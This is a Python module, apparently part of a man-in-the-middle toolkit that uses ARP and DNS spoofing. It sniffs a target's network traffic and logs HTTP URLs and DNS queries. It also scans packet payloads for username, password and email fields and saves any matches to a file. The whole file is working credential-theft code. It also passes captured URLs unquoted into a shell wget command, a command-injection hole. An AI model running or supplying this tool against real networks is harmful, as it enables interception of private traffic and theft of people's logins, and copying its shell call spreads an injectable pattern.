import scapy.all as scapy
from scapy.layers import http
import subprocess
from colorama import Fore
from urllib.parse import urlparse
import os
import sys
from arp_spoof import restore
from dns_spoof import stop_dns_spoof


# Extract URL from HTTP packets
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# Extract login information from raw packet data
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "password", "user", "pass", "login", "email", "uname", "nickname", "mail"]
        for keyword in keywords:
            if keyword in load:
                return load


# Packet sniffing to analyze HTTP and DNS traffic

# Counter for file names
counter_file = 1


def packet_sniffing(args):
    # If your network interface is not `wlan0`, don't forget to change it to your own interface.
    # Update the command accordingly.
    interface = "wlan0"
    output_file = "data_sniffed.txt"
    images_folder = "images"

    def sniff(interface):
        try:
            scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[+] Stopping the program..." + Fore.RESET)
            restore(args.target_ip, args.router_ip)
            print(Fore.RED + "\n[+] Target IP Table restored." + Fore.RESET)
            stop_dns_spoof()
            sys.exit(0)

    def process_sniffed_packet(packet):

        # Globalize the counter
        global counter_file

        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)

            # Convert bytes to str
            url_str = url.decode()
            print(Fore.GREEN + "[+] HTTP Request >> " + url_str + Fore.RESET)

            login_info = get_login_info(packet)
            if login_info:
                print(Fore.RED + "\n\n[+] Possible username/password > " + login_info + "\n\n" + Fore.RESET)

                with open(output_file, "a") as f:
                    f.write(Fore.GREEN + "[+] HTTP Request >> " + url_str + Fore.RESET + "\n")
                    f.write(Fore.RED + "\n\n[+] Possible username/password > " + login_info + Fore.RESET + "\n")

            if any(extension in url_str.lower() for extension in [".jpg", ".jpeg", ".png", "webp", ".svg", ".ico"]):

                # check file for exist?
                url_parsed = urlparse(url_str)
                path = url_parsed.path

                # Combine domain and path to create a unique file name
                unique_name = os.path.join(images_folder, f"{counter_file}{os.path.basename(path)}")

                # Check if the file exists
                if not os.path.exists(unique_name):
                    # don't wget if exist
                    subprocess.call(f"wget {url_str} -O {unique_name} >/dev/null 2>&1", shell=True)
                    print(Fore.YELLOW + "[+] File downloaded >> " + unique_name + Fore.RESET)
                    # Increment the counter
                    counter_file += 1
                else:
                    print(Fore.BLUE + "[+] File already exists >> " + unique_name + Fore.RESET)

        elif packet.haslayer(scapy.DNSRR) and packet.haslayer(scapy.DNSQR):
            # Check for DNS Response and Request
            dns_name = packet[scapy.DNSQR].qname.decode()
            print(Fore.BLUE + "[+] DNS Request >> " + dns_name + Fore.RESET)

            with open(output_file, "a") as f:
                f.write("[+] DNS Request >> " + dns_name + "\n")

    sniff(interface)
